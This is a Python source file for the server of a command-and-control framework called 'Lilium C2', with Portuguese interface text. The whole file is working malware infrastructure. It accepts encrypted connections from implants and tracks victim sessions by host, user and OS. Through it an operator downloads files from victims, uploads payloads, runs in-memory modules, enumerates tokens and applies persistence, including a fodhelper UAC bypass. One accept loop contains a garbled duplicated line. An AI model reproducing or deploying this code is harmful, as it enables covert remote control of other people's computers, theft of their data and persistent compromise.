import base64
import json
import os
import socket
import struct
import sys
import threading
import time
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization

class Session:
    def __init__(self, session_id, conn, aes_key, info, remote_addr):
        self.id = session_id
        self.conn = conn
        self.aes_key = aes_key
        self.info = info
        self.remote_addr = remote_addr

    def send_command(self, cmd):
        try:
            cipher_data = encrypt_aes(self.aes_key, cmd.encode())
            l = len(cipher_data)
            header = struct.pack(">I", l)
            self.conn.sendall(header + cipher_data)
        except:
            pass

sessions = {}
sessions_lock = threading.Lock()

BANNER = "\033[35m" + """
                         ⠘⣷
                 ⢀⣤⣤⣤⣀⡀⠄⠄⠄⢸⡀
                 ⠙⠻⣗⢭⡙⠳⣦⡀⠘⡇⠄⠄⠄⣴⠇
                     ⠈⢷⡌⠣⡄⠄⢰⡇⠄⠄⡴⠁
             ⣠⣴⣞⣛⣛⡛⠛⠛⠶⠄⢻⡆⠉⠄⢸⠄⢀⡜⠁⠄⠛⠛⠻⢦⣄
            ⣼⠛⠛⠳⠶⣦⣍⠙⠲⢤⠄⠄⣿⠄⠄⡏⢠⠎⠄⣀⡤⠤⠒⠶⠂⠙⣧⡀
            ⢿⡄⣿⠄⠄⠄⠉⢻⣄⣀⠄⠄⠛⠄⠸⠡⢋⡴⠊⢁⣠⣤⣶⣶⢤⣄⡘⣇
            ⠙⠻⠆⣠⡶⠟⠋⠉⠉⠛⢶⣶⠖⠶⣦⡀⠠⣴⣯⣁⠄⠄⠙⢷⡈⠻⣿
                ⣰⠏⢀⣋⣉⠉⠉⠲⡄⠙⣧⠄⠈⢃⣀⠄⠄⠉⠳⣄⠄⠈⣷⢀⡟
                ⣿⠟⣿⠋⠉⠛⠷⡄⠸⠄⢹⡖⠛⠉⠉⠙⣷⣦⡀⢹⡆⠄⣿⡾⠁
                ⢿⡄⢿⡀⠄⠄⠄⢰⣆⠄⠛⠄⢠⡆⠄⠄⠸⡏⢻⣼⡇⠄⠋
                 ⠻⣮⣷⡀⠄⠄⠄⠙⠶⣤⠶⠟⠁⠄⠄⢸⡇⢀⡿⠁
                     ⠉⠛⠁⠄⠄⠄⠄⣿⠄⠄⠄⠄⣠⣿⡴⠛
                     ⣠⣤⣤⣄⡀⣿     ⠉
                ⢀⣴⠟⠉⣠⠶⠿⠿⣿
             ⢀⣀⣴⠟⢁⣴⠟⠁     ⣿
             ⠙⠿⣭⣤⡴⠟⠁       ⣿
""" + "\033[m"

def generate_session_id():
    return os.urandom(2).hex()

def encrypt_aes(key, plaintext):
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ciphertext

def decrypt_aes(key, ciphertext):
    aesgcm = AESGCM(key)
    if len(ciphertext) < 12:
        raise Exception("ciphertext curto")
    nonce = ciphertext[:12]
    cipherdata = ciphertext[12:]
    return aesgcm.decrypt(nonce, cipherdata, None)

def handle_client(conn, addr):
    try:
        priv_key = ec.generate_private_key(ec.SECP256R1())
        pub_key = priv_key.public_key()
        pub_key_bytes = pub_key.public_bytes(
            encoding=serialization.Encoding.X962,
            format=serialization.PublicFormat.UncompressedPoint
        )

        buf = conn.recv(1024)
        if not buf:
            conn.close()
            return

        client_pub_key = serialization.load_der_public_key(
            b'\x30\x59\x30\x13\x06\x07\x2a\x86\x48\xce\x3d\x02\x01\x06\x08\x2a\x86\x48\xce\x3d\x03\x01\x07\x03\x42\x00' + buf
        )
        conn.sendall(pub_key_bytes)

        shared_key = priv_key.exchange(ec.ECDH(), client_pub_key)
        aes_key = shared_key
        if len(aes_key) > 32:
            aes_key = aes_key[-32:]
        elif len(aes_key) < 32:
            aes_key = aes_key.rjust(32, b'\x00')

        len_buf = conn.recv(4)
        if not len_buf or len(len_buf) < 4:
            conn.close()
            return
        data_len = struct.unpack(">I", len_buf)[0]

        enc_data = b""
        while len(enc_data) < data_len:
            chunk = conn.recv(data_len - len(enc_data))
            if not chunk:
                break
            enc_data += chunk

        dec_data = decrypt_aes(aes_key, enc_data)
        info = json.loads(dec_data.decode(errors="ignore"))

        sid = generate_session_id()
        sess = Session(
            session_id=sid,
            conn=conn,
            aes_key=aes_key,
            info=info,
            remote_addr=f"{addr[0]}:{addr[1]}"
        )

        with sessions_lock:
            sessions[sid] = sess

        print(f"\n\033[32m[+] Nova sessão estabelecida: ID {sid} [{sess.remote_addr}]\033[m")

        while True:
            len_header = conn.recv(4)
            if not len_header or len(len_header) < 4:
                break
            packet_len = struct.unpack(">I", len_header)[0]

            packet_bytes = b""
            while len(packet_bytes) < packet_len:
                chunk = conn.recv(packet_len - len(packet_bytes))
                if not chunk:
                    break
                packet_bytes += chunk

            if len(packet_bytes) < packet_len:
                break

            try:
                plain = decrypt_aes(aes_key, packet_bytes)
            except:
                continue

            msg = plain.decode(errors="ignore")
            if msg != "[ping]" and msg != "":
                print(f"\n{msg}")

    except:
        pass
    finally:
        with sessions_lock:
            for s_id, s in list(sessions.items()):
                if s.conn == conn:
                    del sessions[s_id]
                    print(f"\n\033[31m[-] Sessão {s_id} encerrada.\033[m")
                    break
        try:
            conn.close()
        except:
            pass

def print_sessions():
    with sessions_lock:
        print("+----------+-------------------------+-------------------+-----------------+----------------+")
        print("|    ID    |            IP           |      Hostname     |     Usuário     |       OS       |")
        print("+----------+-------------------------+-------------------+-----------------+----------------+")
        for sid, s in sessions.items():
            host = str(s.info.get("hostname", ""))
            user = str(s.info.get("username", ""))
            os_name = str(s.info.get("os", ""))
            if len(host) > 17: host = host[:17]
            if len(user) > 15: user = user[:15]
            if len(os_name) > 14: os_name = os_name[:14]
            print(f"| {sid:<8} | {s.remote_addr:<23} | {host:<17} | {user:<15} | {os_name:<14} |")
        print("+----------+-------------------------+-------------------+-----------------+----------------+")

def print_help_menu():
    print("\n========================= [ LILIUM C2 - MANUAL DE COMANDOS ] =========================")
    print("  SISTEMA E ARQUIVOS")
    print("        pwd                       - Exibe o diretório atual de trabalho")
    print("        cd <pasta>                - Altera o diretório atual")
    print("        dir / ls                  - Lista arquivos e pastas no diretório")
    print("        cat / type <arq>          - Exibe o conteúdo de um arquivo de texto")
    print("        rm <arq>                  - Remove um arquivo do disco")
    print("        download <arq>            - Baixa um arquivo da vítima para o servidor C2")
    print("        upload <local> <remoto>   - Envia um arquivo do C2 para a máquina vítima")
    print("\n  ENUMERAÇÃO DE HOST E TOKEN")
    print("        hostname                  - Exibe o nome do host atual (Nativo)")
    print("        env                       - Lista variáveis de ambiente (Nativo)")
    print("        ipconfig                  - Exibe interfaces e endereços de rede (Nativo)")
    print("        whoami                    - Exibe o contexto atual de usuário")
    print("        privs                     - Lista privilégios do token atual (Nativo)")
    print("        groups                    - Lista os grupos do token atual (Nativo)")
    print("\n  EXECUÇÃO CONTROLADA & MÓDULOS")
    print("        exec <binario> [args]     - Executa binário via Fork&Run com pipes redirecionados")
    print("        modules list              - Lista os módulos disponíveis na pasta modules/")
    print("        modules run <nome> [args] - Executa módulo (.NET in-memory ou .exe nativo)")
    print("\n  PERSISTÊNCIA E CONTROLE")
    print("        persist <startup|taskscheduler|fodhelper> - Aplica persistência escolhida")
    print("        exit / back               - Sai da sessão interativa atual")
    print("=======================================================================================")

def handle_modules_command(sess, cmd_args):
    parts = cmd_args.split()
    if not parts or parts[0] == "list":
        if not os.path.exists("modules"):
            print("[-] Pasta 'modules/' não encontrada no servidor. Crie-a.")
            return
        files = os.listdir("modules")
        print("\n[+] Módulos Disponíveis na Pasta 'modules/':")
        print("----------------------------------------")
        for f in files:
            if not os.path.isdir(os.path.join("modules", f)):
                print(f" - {f}")
        print("----------------------------------------")
        print("Uso: modules run <nome_do_modulo> [args]")
        return

    if parts[0] == "run":
        if len(parts) < 2:
            print("[-] Uso: modules run <nome_do_modulo> [args]")
            return
        mod_name = parts[1]
        mod_path = os.path.join("modules", mod_name)

        try:
            with open(mod_path, "rb") as f:
                file_bytes = f.read()
        except Exception as e:
            print(f"[-] Erro ao ler módulo '{mod_name}': {e}")
            return

        args_str = " ".join(parts[2:]) if len(parts) > 2 else ""

        payload_map = {
            "name": mod_name,
            "args": args_str,
            "data": base64.b64encode(file_bytes).decode()
        }
        payload_bytes = json.dumps(payload_map).encode()
        sess.send_command("run_module " + payload_bytes.decode())
        print(f"[*] Módulo '{mod_name}' despachado para a sessão. Aguardando execução...")

def interactive_shell(sid):
    with sessions_lock:
        sess = sessions.get(sid)

    if not sess:
        print("[-] Sessão não encontrada.")
        return

    print(f"[*] Entrando na sessão {sid}. Digite 'help' para ver o manual.")

    while True:
        try:
            cmd = input(f"lilium ({sid}) > ").strip()
        except (KeyboardInterrupt, EOFError):
            break

        if not cmd:
            continue
        if cmd in ["exit", "back"]:
            print("[*] Saindo da sessão...")
            break
        if cmd == "help":
            print_help_menu()
            continue

        if cmd.startswith("modules"):
            mod_args = cmd[len("modules"):].strip()
            handle_modules_command(sess, mod_args)
            continue

        if cmd.startswith("upload "):
            parts = cmd.split()
            if len(parts) < 3:
                print("[-] Uso correto: upload <arquivo_local> <caminho_remoto>")
                continue
            local_path = parts[1]
            remote_path = parts[2]

            try:
                with open(local_path, "rb") as f:
                    file_bytes = f.read()
            except Exception as e:
                print(f"[-] Erro ao ler arquivo local: {e}")
                continue

            payload_map = {
                "path": remote_path,
                "data": base64.b64encode(file_bytes).decode()
            }
            payload_bytes = json.dumps(payload_map).encode()
            sess.send_command("upload_payload " + payload_bytes.decode())
            continue

        sess.send_command(cmd)
        time.sleep(0.6)

def main():
    os.makedirs("modules", exist_ok=True)

    if not os.path.exists("cert.pem") or not os.path.exists("key.pem"):
        print("[!] Erro ao carregar certificado TLS. Certifique-se de gerar cert.pem e key.pem.")
        sys.exit(1)

    import ssl
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(("0.0.0.0", 443))
    server_socket.listen(5)

    print(BANNER)
    print("[+] Servidor Lilium C2 iniciado na porta 443 (TLS + ECDH)")

    def accept_clients():
        while True:
            try:
                conn, addr = server_socket.accept()
                tls_conn = context.wrap_socket(conn, server_side=True)
                threading.Thread(target=handle_client, args=(tls_conn, addr), daemon=True).strt = threading.Thread(target=handle_client, args=(tls_conn, addr), daemon=True).start()
            except:
                continue


    def safe_accept():
        while True:
            try:
                conn, addr = server_socket.accept()
                tls_conn = context.wrap_socket(conn, server_side=True)
                t = threading.Thread(target=handle_client, args=(tls_conn, addr), daemon=True)
                t.start()
            except:
                continue

    threading.Thread(target=safe_accept, daemon=True).start()

    while True:
        try:
            line = input("lilium-server> ").strip()
        except (KeyboardInterrupt, EOFError):
            break

        if line == "sessions":
            print_sessions()
        elif line.startswith("use "):
            sid = line[len("use "):].strip()
            interactive_shell(sid)
        elif line == "exit":
            print("[*] Saindo...")
            sys.exit(0)
        else:
            print("Comandos disponíveis: sessions, use <id>, exit")

main()
